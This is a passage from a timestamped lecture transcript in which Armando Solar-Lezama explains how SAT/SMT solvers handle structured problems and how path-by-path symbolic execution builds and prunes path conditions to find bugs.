              <time_slice>48:14</time_slice>
              <text_slice>flat-lines and says, sorry, I
just can't figure this out yet?</text_slice>
            </slice>
            <slice>
              <time_slice>48:18</time_slice>
              <text_slice>Has that ever happened
or is that just--</text_slice>
            </slice>
            <slice>
              <time_slice>48:20</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: Yes.</text_slice>
            </slice>
            <slice>
              <time_slice>48:21</time_slice>
              <text_slice>Yes, it does happen.</text_slice>
            </slice>
            <slice>
              <time_slice>48:22</time_slice>
              <text_slice>And a big part of
the engineering</text_slice>
            </slice>
            <slice>
              <time_slice>48:24</time_slice>
              <text_slice>of these kind of
tools is making sure</text_slice>
            </slice>
            <slice>
              <time_slice>48:27</time_slice>
              <text_slice>that this happens as
infrequently as possible.</text_slice>
            </slice>
            <slice>
              <time_slice>48:30</time_slice>
              <text_slice>And part what makes
this work at all</text_slice>
            </slice>
            <slice>
              <time_slice>48:35</time_slice>
              <text_slice>is that we're not solving
random SAT problems.</text_slice>
            </slice>
            <slice>
              <time_slice>48:40</time_slice>
              <text_slice>We're not solving completely
random bit-vector problems.</text_slice>
            </slice>
            <slice>
              <time_slice>48:44</time_slice>
              <text_slice>We're solving problems that
have a certain structure to them</text_slice>
            </slice>
            <slice>
              <time_slice>48:47</time_slice>
              <text_slice>that a person was
able to look at it</text_slice>
            </slice>
            <slice>
              <time_slice>48:50</time_slice>
              <text_slice>and least have some confidence
that this worked, right?</text_slice>
            </slice>
            <slice>
              <time_slice>48:53</time_slice>
              <text_slice>Build some argument in their
head for why this worked.</text_slice>
            </slice>
            <slice>
              <time_slice>48:57</time_slice>
              <text_slice>And so what the solvers
are trying to do</text_slice>
            </slice>
            <slice>
              <time_slice>49:00</time_slice>
              <text_slice>is essentially exploiting
that structure.</text_slice>
            </slice>
            <slice>
              <time_slice>49:02</time_slice>
              <text_slice>And taking advantage, for
example, the description</text_slice>
            </slice>
            <slice>
              <time_slice>49:05</time_slice>
              <text_slice>that I gave you of what the
SAT solver is doing internally,</text_slice>
            </slice>
            <slice>
              <time_slice>49:08</time_slice>
              <text_slice>that's taking advantage
of the fact that, yes.</text_slice>
            </slice>
            <slice>
              <time_slice>49:10</time_slice>
              <text_slice>Your problem might have a
million Boolean variables,</text_slice>
            </slice>
            <slice>
              <time_slice>49:13</time_slice>
              <text_slice>but actually most
of those variables</text_slice>
            </slice>
            <slice>
              <time_slice>49:15</time_slice>
              <text_slice>are very tightly dependent
on the values of each other.</text_slice>
            </slice>
            <slice>
              <time_slice>49:18</time_slice>
              <text_slice>So the number of degrees
of freedom in the problem</text_slice>
            </slice>
            <slice>
              <time_slice>49:20</time_slice>
              <text_slice>is actually much smaller
than what the million</text_slice>
            </slice>
            <slice>
              <time_slice>49:23</time_slice>
              <text_slice>variables would suggest.</text_slice>
            </slice>
            <slice>
              <time_slice>49:24</time_slice>
              <text_slice>AUDIENCE: So you're saying
is that this isn't an exam</text_slice>
            </slice>
            <slice>
              <time_slice>49:27</time_slice>
              <text_slice>question.</text_slice>
            </slice>
            <slice>
              <time_slice>49:27</time_slice>
              <text_slice>This is real life.</text_slice>
            </slice>
            <slice>
              <time_slice>49:28</time_slice>
              <text_slice>And someone built this system.</text_slice>
            </slice>
            <slice>
              <time_slice>49:29</time_slice>
              <text_slice>It was supposed to
work and make sense.</text_slice>
            </slice>
            <slice>
              <time_slice>49:30</time_slice>
              <text_slice>So it's probably
not going to be one</text_slice>
            </slice>
            <slice>
              <time_slice>49:32</time_slice>
              <text_slice>of those wildly bizarre
theoretical [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>49:34</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA:
That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>49:38</time_slice>
              <text_slice>And in practice what
happens and when</text_slice>
            </slice>
            <slice>
              <time_slice>49:40</time_slice>
              <text_slice>you use this tool is the
thing is you always do</text_slice>
            </slice>
            <slice>
              <time_slice>49:43</time_slice>
              <text_slice>is set timeouts.</text_slice>
            </slice>
            <slice>
              <time_slice>49:45</time_slice>
              <text_slice>So generally, what happens
is because it's exponential,</text_slice>
            </slice>
            <slice>
              <time_slice>49:49</time_slice>
              <text_slice>exponential doesn't mean
that you can't do it.</text_slice>
            </slice>
            <slice>
              <time_slice>49:51</time_slice>
              <text_slice>Exponential just means
that there's a brick wall,</text_slice>
            </slice>
            <slice>
              <time_slice>49:54</time_slice>
              <text_slice>that before that brick
wall things will work,</text_slice>
            </slice>
            <slice>
              <time_slice>49:57</time_slice>
              <text_slice>and in fact, they
will work really fast.</text_slice>
            </slice>
            <slice>
              <time_slice>49:59</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>50:00</time_slice>
              <text_slice>The exponential
works in both ways.</text_slice>
            </slice>
            <slice>
              <time_slice>50:01</time_slice>
              <text_slice>Yes, when you're
going out then things</text_slice>
            </slice>
            <slice>
              <time_slice>50:04</time_slice>
              <text_slice>are growing very
quickly, but when</text_slice>
            </slice>
            <slice>
              <time_slice>50:06</time_slice>
              <text_slice>you're going toward smaller
problems, or simpler problems</text_slice>
            </slice>
            <slice>
              <time_slice>50:09</time_slice>
              <text_slice>things are also getting
faster very, very quickly.</text_slice>
            </slice>
            <slice>
              <time_slice>50:12</time_slice>
              <text_slice>So in general what that means
is that lots of problems</text_slice>
            </slice>
            <slice>
              <time_slice>50:17</time_slice>
              <text_slice>finish very, very quickly.</text_slice>
            </slice>
            <slice>
              <time_slice>50:19</time_slice>
              <text_slice>And then some problems timeout.</text_slice>
            </slice>
            <slice>
              <time_slice>50:21</time_slice>
              <text_slice>And the key is to engineer
things in such a way</text_slice>
            </slice>
            <slice>
              <time_slice>50:24</time_slice>
              <text_slice>that among the problems that
finish quickly are actually</text_slice>
            </slice>
            <slice>
              <time_slice>50:28</time_slice>
              <text_slice>problems of practical use.</text_slice>
            </slice>
            <slice>
              <time_slice>50:30</time_slice>
              <text_slice>Or problems that will
actually point you</text_slice>
            </slice>
            <slice>
              <time_slice>50:33</time_slice>
              <text_slice>to security vulnerabilities
in your system,</text_slice>
            </slice>
            <slice>
              <time_slice>50:35</time_slice>
              <text_slice>will point you to bugs,
will point you to a path</text_slice>
            </slice>
            <slice>
              <time_slice>50:39</time_slice>
              <text_slice>that you maybe haven't
explored before,</text_slice>
            </slice>
            <slice>
              <time_slice>50:41</time_slice>
              <text_slice>or inputs that will take
you down paths that you</text_slice>
            </slice>
            <slice>
              <time_slice>50:43</time_slice>
              <text_slice>hadn't explored before.</text_slice>
            </slice>
            <slice>
              <time_slice>50:45</time_slice>
              <text_slice>AUDIENCE: Thanks.</text_slice>
            </slice>
            <slice>
              <time_slice>50:46</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA:
Other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>50:52</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>50:53</time_slice>
              <text_slice>So we know how to
go from a formula,</text_slice>
            </slice>
            <slice>
              <time_slice>50:57</time_slice>
              <text_slice>from a set of constraints, to
an answer that will either say,</text_slice>
            </slice>
            <slice>
              <time_slice>51:01</time_slice>
              <text_slice>yes, this formula
has a solution.</text_slice>
            </slice>
            <slice>
              <time_slice>51:03</time_slice>
              <text_slice>And here's a solution, or no,
this formula is unsatisfiable.</text_slice>
            </slice>
            <slice>
              <time_slice>51:08</time_slice>
              <text_slice>There is no input
that satisfies this.</text_slice>
            </slice>
            <slice>
              <time_slice>51:10</time_slice>
              <text_slice>So now how do we get a
formula from a program?</text_slice>
            </slice>
            <slice>
              <time_slice>51:15</time_slice>
              <text_slice>So one of the
things that you have</text_slice>
            </slice>
            <slice>
              <time_slice>51:18</time_slice>
              <text_slice>when you're doing
symbolic execution</text_slice>
            </slice>
            <slice>
              <time_slice>51:20</time_slice>
              <text_slice>is that when you get
to a branch and you</text_slice>
            </slice>
            <slice>
              <time_slice>51:23</time_slice>
              <text_slice>don't know which direction
the branch is going to go.</text_slice>
            </slice>
            <slice>
              <time_slice>51:26</time_slice>
              <text_slice>Now there are two possibilities
that you can do in that case.</text_slice>
            </slice>
            <slice>
              <time_slice>51:30</time_slice>
              <text_slice>One is to do what we did in the
early example, which is just</text_slice>
            </slice>
            <slice>
              <time_slice>51:35</time_slice>
              <text_slice>to say, I'm going to take both
branches at the same time.</text_slice>
            </slice>
            <slice>
              <time_slice>51:37</time_slice>
              <text_slice>I'm going to collect what
happens in mode's branches,</text_slice>
            </slice>
            <slice>
              <time_slice>51:40</time_slice>
              <text_slice>merge at the end.</text_slice>
            </slice>
            <slice>
              <time_slice>51:42</time_slice>
              <text_slice>That is a strategy
that is often used</text_slice>
            </slice>
            <slice>
              <time_slice>51:46</time_slice>
              <text_slice>when you're trying to get very
strong guarantees in general.</text_slice>
            </slice>
            <slice>
              <time_slice>51:50</time_slice>
              <text_slice>But it's a strategy that
doesn't work too well</text_slice>
            </slice>
            <slice>
              <time_slice>51:54</time_slice>
              <text_slice>with modern and SMT solvers.</text_slice>
            </slice>
            <slice>
              <time_slice>51:56</time_slice>
              <text_slice>So often people prefer to do
one path at a time exploration.</text_slice>
            </slice>
            <slice>
              <time_slice>52:02</time_slice>
              <text_slice>And what that means
is that you're</text_slice>
            </slice>
            <slice>
              <time_slice>52:04</time_slice>
              <text_slice>going to pick a path
down your program.</text_slice>
            </slice>
            <slice>
              <time_slice>52:06</time_slice>
              <text_slice>And then you're going to
create a formula for that path.</text_slice>
            </slice>
            <slice>
              <time_slice>52:10</time_slice>
              <text_slice>So you're going to ask, fine
me an input that goes down</text_slice>
            </slice>
            <slice>
              <time_slice>52:13</time_slice>
              <text_slice>this path and that
satisfies my constraint,</text_slice>
            </slice>
            <slice>
              <time_slice>52:18</time_slice>
              <text_slice>or that violates
my property, that</text_slice>
            </slice>
            <slice>
              <time_slice>52:21</time_slice>
              <text_slice>goes out of bounds in my buffer,
or that causes a null pointer</text_slice>
            </slice>
            <slice>
              <time_slice>52:26</time_slice>
              <text_slice>error.</text_slice>
            </slice>
            <slice>
              <time_slice>52:27</time_slice>
              <text_slice>And then if you
can't find one then</text_slice>
            </slice>
            <slice>
              <time_slice>52:29</time_slice>
              <text_slice>you try a different path
and a different path.</text_slice>
            </slice>
            <slice>
              <time_slice>52:32</time_slice>
              <text_slice>And you do these path
explorations one at a time.</text_slice>
            </slice>
            <slice>
              <time_slice>52:38</time_slice>
              <text_slice>So that's the strategy that
we're going to talk about now.</text_slice>
            </slice>
            <slice>
              <time_slice>52:42</time_slice>
              <text_slice>It's a little bit easier
to describe how to do it.</text_slice>
            </slice>
            <slice>
              <time_slice>52:44</time_slice>
              <text_slice>So let's say that we
have a problem like this.</text_slice>
            </slice>
            <slice>
              <time_slice>52:49</time_slice>
              <text_slice>So, by the way, I
switched representations.</text_slice>
            </slice>
            <slice>
              <time_slice>52:51</time_slice>
              <text_slice>So I'm not representing the
program as a block of code</text_slice>
            </slice>
            <slice>
              <time_slice>52:54</time_slice>
              <text_slice>and representing it as
a control flow graph.</text_slice>
            </slice>
            <slice>
              <time_slice>52:58</time_slice>
              <text_slice>Is everybody here familiar
with a control flow graph?</text_slice>
            </slice>
            <slice>
              <time_slice>53:00</time_slice>
              <text_slice>Or is anybody here not familiar
with a control flow graph?</text_slice>
            </slice>
            <slice>
              <time_slice>53:03</time_slice>
              <text_slice>It's just a representation
of a program that</text_slice>
            </slice>
            <slice>
              <time_slice>53:05</time_slice>
              <text_slice>makes branches more explicit.</text_slice>
            </slice>
            <slice>
              <time_slice>53:08</time_slice>
              <text_slice>So let's pick a path.</text_slice>
            </slice>
            <slice>
              <time_slice>53:13</time_slice>
              <text_slice>And so let's say that we
care about this path, right,</text_slice>
            </slice>
            <slice>
              <time_slice>53:17</time_slice>
              <text_slice>a path that starts
at the beginning</text_slice>
            </slice>
            <slice>
              <time_slice>53:19</time_slice>
              <text_slice>and takes us all the way
down to the point where</text_slice>
            </slice>
            <slice>
              <time_slice>53:23</time_slice>
              <text_slice>we are asserting false.</text_slice>
            </slice>
            <slice>
              <time_slice>53:27</time_slice>
              <text_slice>And we want to know,
is this path feasible?</text_slice>
            </slice>
            <slice>
              <time_slice>53:29</time_slice>
              <text_slice>Could the program
go down this path?</text_slice>
            </slice>
            <slice>
              <time_slice>53:32</time_slice>
              <text_slice>So as we're going
down this program</text_slice>
            </slice>
            <slice>
              <time_slice>53:35</time_slice>
              <text_slice>we're going to keep two things.</text_slice>
            </slice>
            <slice>
              <time_slice>53:42</time_slice>
              <text_slice>We're going to keep
an environment that</text_slice>
            </slice>
            <slice>
              <time_slice>53:43</time_slice>
              <text_slice>keeps track of the
symbolic values</text_slice>
            </slice>
            <slice>
              <time_slice>53:46</time_slice>
              <text_slice>of the different variables.</text_slice>
            </slice>
            <slice>
              <time_slice>53:48</time_slice>
              <text_slice>And in addition to that,
we're going to keep around</text_slice>
            </slice>
            <slice>
              <time_slice>53:52</time_slice>
              <text_slice>an environment for constraints.</text_slice>
            </slice>
            <slice>
              <time_slice>54:04</time_slice>
              <text_slice>And these constraints
are essentially</text_slice>
            </slice>
            <slice>
              <time_slice>54:05</time_slice>
              <text_slice>going to keep track of
all the relationships</text_slice>
            </slice>
            <slice>
              <time_slice>54:08</time_slice>
              <text_slice>between these variables as
well as any assumptions,</text_slice>
            </slice>
            <slice>
              <time_slice>54:12</time_slice>
              <text_slice>whether they were
assumptions that</text_slice>
            </slice>
            <slice>
              <time_slice>54:13</time_slice>
              <text_slice>were made at the
beginning, or assumptions</text_slice>
            </slice>
            <slice>
              <time_slice>54:15</time_slice>
              <text_slice>that come from the branches
that you are taking.</text_slice>
            </slice>
            <slice>
              <time_slice>54:18</time_slice>
              <text_slice>So in this case, when
we start down this path</text_slice>
            </slice>
            <slice>
              <time_slice>54:21</time_slice>
              <text_slice>we get to t equals 0, so
our state is x, y, and 0.</text_slice>
            </slice>
            <slice>
              <time_slice>54:29</time_slice>
              <text_slice>And so far we have
no constraints</text_slice>
            </slice>
            <slice>
              <time_slice>54:31</time_slice>
              <text_slice>because we didn't have any
constraint in the beginning.</text_slice>
            </slice>
            <slice>
              <time_slice>54:35</time_slice>
              <text_slice>So now we're going
to take this branch</text_slice>
            </slice>
            <slice>
              <time_slice>54:39</time_slice>
              <text_slice>and, again, because we've
made a decision that we're</text_slice>
            </slice>
            <slice>
              <time_slice>54:41</time_slice>
              <text_slice>going to go down the
path to your right,</text_slice>
            </slice>
            <slice>
              <time_slice>54:45</time_slice>
              <text_slice>then we know that this
path will only happen when?</text_slice>
            </slice>
            <slice>
              <time_slice>54:56</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>54:57</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA:
That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>54:58</time_slice>
              <text_slice>So we get our first constraint
that says, x is greater than y.</text_slice>
            </slice>
            <slice>
              <time_slice>55:04</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>55:05</time_slice>
              <text_slice>So now down here we're
looking at t equals y.</text_slice>
            </slice>
            <slice>
              <time_slice>55:13</time_slice>
              <text_slice>Now in this case because we're
going only one path at a time</text_slice>
            </slice>
            <slice>
              <time_slice>55:16</time_slice>
              <text_slice>we don't actually need to
introduce a new variable for t</text_slice>
            </slice>
            <slice>
              <time_slice>55:19</time_slice>
              <text_slice>necessarily.</text_slice>
            </slice>
            <slice>
              <time_slice>55:20</time_slice>
              <text_slice>We can just say, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>55:22</time_slice>
              <text_slice>t is equal to y.</text_slice>
            </slice>
            <slice>
              <time_slice>55:23</time_slice>
              <text_slice>So that means that
t is no longer 0.</text_slice>
            </slice>
            <slice>
              <time_slice>55:27</time_slice>
              <text_slice>It's now y.</text_slice>
            </slice>
            <slice>
              <time_slice>55:31</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>55:31</time_slice>
              <text_slice>And then keep going.</text_slice>
            </slice>
            <slice>
              <time_slice>55:32</time_slice>
              <text_slice>We get to this point.</text_slice>
            </slice>
            <slice>
              <time_slice>55:34</time_slice>
              <text_slice>Now we hit another branch.</text_slice>
            </slice>
            <slice>
              <time_slice>55:37</time_slice>
              <text_slice>What's a new
assumption that we have</text_slice>
            </slice>
            <slice>
              <time_slice>55:39</time_slice>
              <text_slice>to make if we're assuming
that we went down this path?</text_slice>
            </slice>
            <slice>
              <time_slice>55:49</time_slice>
              <text_slice>Just t less than y, right?</text_slice>
            </slice>
            <slice>
              <time_slice>55:51</time_slice>
              <text_slice>And what is t?</text_slice>
            </slice>
            <slice>
              <time_slice>55:56</time_slice>
              <text_slice>Right.</text_slice>
            </slice>
            <slice>
              <time_slice>55:57</time_slice>
              <text_slice>So in fact if we look up
t, so t has the value y.</text_slice>
            </slice>
            <slice>
              <time_slice>56:00</time_slice>
              <text_slice>We look up y.</text_slice>
            </slice>
            <slice>
              <time_slice>56:01</time_slice>
              <text_slice>y also has the value of y.</text_slice>
            </slice>
            <slice>
              <time_slice>56:03</time_slice>
              <text_slice>So this constraint actually
translates to y less than y.</text_slice>
            </slice>
            <slice>
              <time_slice>56:09</time_slice>
              <text_slice>So what does this tell us?</text_slice>
            </slice>
            <slice>
              <time_slice>56:11</time_slice>
              <text_slice>It tells us that in order
to make it to this point,</text_slice>
            </slice>
            <slice>
              <time_slice>56:16</time_slice>
              <text_slice>in order to make it to a assert
false, all of those things</text_slice>
            </slice>
            <slice>
              <time_slice>56:20</time_slice>
              <text_slice>have to hold.</text_slice>
            </slice>
            <slice>
              <time_slice>56:21</time_slice>
              <text_slice>Can they hold?</text_slice>
            </slice>
            <slice>
              <time_slice>56:22</time_slice>
              <text_slice>Clearly not.</text_slice>
            </slice>
            <slice>
              <time_slice>56:23</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>56:24</time_slice>
              <text_slice>y less than y alone is
already sufficient for things</text_slice>
            </slice>
            <slice>
              <time_slice>56:28</time_slice>
              <text_slice>not to hold.</text_slice>
            </slice>
            <slice>
              <time_slice>56:29</time_slice>
              <text_slice>And so that tells us immediately
that this is unsatisfiable.</text_slice>
            </slice>
            <slice>
              <time_slice>56:35</time_slice>
              <text_slice>And this is often known
as a path condition.</text_slice>
            </slice>
            <slice>
              <time_slice>56:39</time_slice>
              <text_slice>This is a condition
that has to be</text_slice>
            </slice>
            <slice>
              <time_slice>56:42</time_slice>
              <text_slice>true in order for the
program to go down that path.</text_slice>
            </slice>
            <slice>
              <time_slice>56:47</time_slice>
              <text_slice>And so we know that this path
condition cannot be satisfied.</text_slice>
            </slice>
            <slice>
              <time_slice>56:51</time_slice>
              <text_slice>And therefore, that it's
impossible for the program</text_slice>
            </slice>
            <slice>
              <time_slice>56:54</time_slice>
              <text_slice>to take this path.</text_slice>
            </slice>
            <slice>
              <time_slice>56:55</time_slice>
              <text_slice>So this path is now
completely eliminated.</text_slice>
            </slice>
            <slice>
              <time_slice>57:01</time_slice>
              <text_slice>We know that this
path cannot be taken.</text_slice>
            </slice>
            <slice>
              <time_slice>57:05</time_slice>
              <text_slice>And, in fact, so
this constraint we're</text_slice>
            </slice>
            <slice>
              <time_slice>57:08</time_slice>
              <text_slice>actually going to just keep them
around as the condition itself.</text_slice>
            </slice>
            <slice>
              <time_slice>57:13</time_slice>
              <text_slice>All right?</text_slice>
            </slice>
            <slice>
              <time_slice>57:14</time_slice>
              <text_slice>So what about a different path?</text_slice>
            </slice>
            <slice>
              <time_slice>57:17</time_slice>
              <text_slice>So now we're trying this path.</text_slice>
            </slice>
            <slice>
              <time_slice>57:24</time_slice>
              <text_slice>So what would be the
path condition for this?</text_slice>
            </slice>
            <slice>
              <time_slice>57:29</time_slice>
              <text_slice>So, again, our symbolic
state starts with t equals 0,</text_slice>
            </slice>
            <slice>
              <time_slice>57:35</time_slice>
              <text_slice>and x and y equals to just
the variables x and y.</text_slice>
            </slice>
            <slice>
              <time_slice>57:39</time_slice>
              <text_slice>And now how does
the path constraint</text_slice>
            </slice>
            <slice>
              <time_slice>57:43</time_slice>
              <text_slice>look like in this case?</text_slice>
            </slice>
            <slice>
              <time_slice>57:44</time_slice>
              <text_slice>So by the time we get here how
does the path condition look</text_slice>
            </slice>
            <slice>
              <time_slice>57:48</time_slice>
              <text_slice>like?</text_slice>
            </slice>
            <slice>
              <time_slice>57:50</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>57:53</time_slice>
              <text_slice>ARMANDO SOLAR LEZAMA: Right.</text_slice>
            </slice>
            <slice>
              <time_slice>57:54</time_slice>
              <text_slice>So in this case [INAUDIBLE]
this is true and this is false.</text_slice>
            </slice>
            <slice>
              <time_slice>57:59</time_slice>
              <text_slice>So in this case it says,
OK. x is greater than y.</text_slice>
            </slice>
            <slice>
              <time_slice>58:06</time_slice>
              <text_slice>And we are setting
t to be equal to x.</text_slice>
            </slice>
            <slice>
              <time_slice>58:10</time_slice>
              <text_slice>So then when we get here
we have x is less than y.</text_slice>
            </slice>
            <slice>
              <time_slice>58:21</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>58:21</time_slice>
              <text_slice>And once again it's very
clear that this path condition</text_slice>
            </slice>
            <slice>
              <time_slice>58:24</time_slice>
              <text_slice>is unsatisfiable.</text_slice>
            </slice>
            <slice>
              <time_slice>58:26</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>58:27</time_slice>
              <text_slice>We cannot have x greater than
y and x less than y at the same</text_slice>
            </slice>
            <slice>
              <time_slice>58:30</time_slice>
              <text_slice>time.</text_slice>
            </slice>
            <slice>
              <time_slice>58:31</time_slice>
              <text_slice>There's no assignment
to x that will satisfy</text_slice>
            </slice>
            <slice>
              <time_slice>58:33</time_slice>
              <text_slice>both of those constraints.</text_slice>
            </slice>
            <slice>
              <time_slice>58:35</time_slice>
              <text_slice>So what that tells us is, again,
that this other path is also</text_slice>
            </slice>
            <slice>
              <time_slice>58:38</time_slice>
              <text_slice>unsatisfiable.</text_slice>
            </slice>
            <slice>
              <time_slice>58:40</time_slice>
              <text_slice>And now at this
point we've actually</text_slice>
            </slice>
            <slice>
              <time_slice>58:42</time_slice>
              <text_slice>explored every possible path in
our program that could lead us</text_slice>
            </slice>
            <slice>
              <time_slice>58:46</time_slice>
              <text_slice>to this condition.</text_slice>
            </slice>
            <slice>
              <time_slice>58:47</time_slice>
              <text_slice>So we can actually
establish and certify</text_slice>
            </slice>
            <slice>
              <time_slice>58:50</time_slice>
              <text_slice>that there is no possible path
that will lead to an assertion</text_slice>
            </slice>
            <slice>
              <time_slice>58:56</time_slice>
              <text_slice>failure.</text_slice>
            </slice>
            <slice>
              <time_slice>58:57</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>58:58</time_slice>
              <text_slice>AUDIENCE: The way you
just presented it,</text_slice>
            </slice>
            <slice>
              <time_slice>59:00</time_slice>
              <text_slice>it makes it look as if you would
explore every possible branch.</text_slice>
            </slice>
            <slice>
              <time_slice>59:03</time_slice>
              <text_slice>I mean, one of the advantages
of symbolic execution</text_slice>
            </slice>
            <slice>
              <time_slice>59:06</time_slice>
              <text_slice>is that you're trying
to prevent [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>59:07</time_slice>
              <text_slice>a need of exploring all possible
[INAUDIBLE] exponential.</text_slice>
            </slice>
            <slice>
              <time_slice>59:11</time_slice>
              <text_slice>So how are you avoiding
that over here?</text_slice>
            </slice>
            <slice>
              <time_slice>59:13</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: That's
a very good question, right?</text_slice>
            </slice>
            <slice>
              <time_slice>59:15</time_slice>
              <text_slice>So in this case essentially
what you have is</text_slice>
            </slice>
            <slice>
              <time_slice>59:18</time_slice>
              <text_slice>you have a trade off between
high symbolic and how concrete</text_slice>
            </slice>
            <slice>
              <time_slice>59:21</time_slice>
              <text_slice>you want to be.</text_slice>
            </slice>
            <slice>
              <time_slice>59:22</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>59:22</time_slice>
              <text_slice>So in this case we are not
as symbolic as the first time</text_slice>
            </slice>
            <slice>
              <time_slice>59:26</time_slice>
              <text_slice>around when we were visiting
both branches at the same time,</text_slice>
            </slice>
            <slice>
              <time_slice>59:30</time_slice>
              <text_slice>but in exchange for that our
constraints became very, very</text_slice>
            </slice>
            <slice>
              <time_slice>59:34</time_slice>
              <text_slice>simple.</text_slice>
            </slice>
            <slice>
              <time_slice>59:35</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>59:35</time_slice>
              <text_slice>So the individual path by path
constraints are very simple,</text_slice>
            </slice>
            <slice>
              <time_slice>59:39</time_slice>
              <text_slice>but you have to do this over,
and over, and over again</text_slice>
            </slice>
            <slice>
              <time_slice>59:42</time_slice>
              <text_slice>to explore all the
different branches.</text_slice>
            </slice>
            <slice>
              <time_slice>59:44</time_slice>
              <text_slice>And there are exponentially--
all the different paths.</text_slice>
            </slice>
            <slice>
              <time_slice>59:46</time_slice>
              <text_slice>And there are exponentially
many paths in a program.</text_slice>
            </slice>
            <slice>
              <time_slice>59:50</time_slice>
              <text_slice>Now there are
exponentially many paths,</text_slice>
            </slice>
            <slice>
              <time_slice>59:53</time_slice>
              <text_slice>but for every path
in general, there's</text_slice>
            </slice>
            <slice>
              <time_slice>59:55</time_slice>
              <text_slice>also an exponentially
large set of inputs</text_slice>
            </slice>
            <slice>
              <time_slice>59:58</time_slice>
              <text_slice>that could go down that path.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:00</time_slice>
              <text_slice>So this already gives you a
big benefit because instead</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:02</time_slice>
              <text_slice>of having to try every
possible input you're only</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:05</time_slice>
              <text_slice>trying every possible path.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:08</time_slice>
              <text_slice>But can you do better?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:10</time_slice>
              <text_slice>And this is one of the
areas where there's</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:14</time_slice>
              <text_slice>been a lot of experimentation in
the area of symbolic execution.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:19</time_slice>
              <text_slice>When you do path
by path reasoning?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:22</time_slice>
              <text_slice>When do you do all
paths at the same time?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:26</time_slice>
              <text_slice>And one of the things
that you saw, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:28</time_slice>
              <text_slice>in the [? Clee ?] paper
is a set of heuristics,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:31</time_slice>
              <text_slice>and a set of
strategies they used</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:33</time_slice>
              <text_slice>to make the search tractable.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:35</time_slice>
              <text_slice>For example, one of
the things that they do</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:37</time_slice>
              <text_slice>is that they are
exploring path by path,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:40</time_slice>
              <text_slice>but they're not exploring
completely blindly.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:43</time_slice>
              <text_slice>And they are also checking
the path conditions</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:47</time_slice>
              <text_slice>after every step.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:49</time_slice>
              <text_slice>So that, for example,
if here instead of just</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:53</time_slice>
              <text_slice>assert false, if this were
a very complex program tree,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:02</time_slice>
              <text_slice>control flow graph.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:03</time_slice>
              <text_slice>You don't wait until
you get to the very end</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:07</time_slice>
              <text_slice>to check whether the
path is feasible.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:10</time_slice>
              <text_slice>The moment you get here you know
that this path is unsatisfiable</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:13</time_slice>
              <text_slice>and you never go
down this direction.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:16</time_slice>
              <text_slice>You always go in
the other direction.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:18</time_slice>
              <text_slice>So pruning the paths
early helps cut down a lot</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:24</time_slice>
              <text_slice>on the experiential blow up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:26</time_slice>
              <text_slice>And exploring the
paths intelligently</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:28</time_slice>
              <text_slice>helps a lot in
preventing blow up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:32</time_slice>
              <text_slice>A lot of the practical
tools that are used today,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:35</time_slice>
              <text_slice>some of the things
that they will do</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:36</time_slice>
              <text_slice>is they will actually start
with some random testing</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:39</time_slice>
              <text_slice>to get an initial set of paths.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:42</time_slice>
              <text_slice>And then they will start looking
for paths in the neighborhood</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:45</time_slice>
              <text_slice>of those paths.</text_slice>
            </slice>
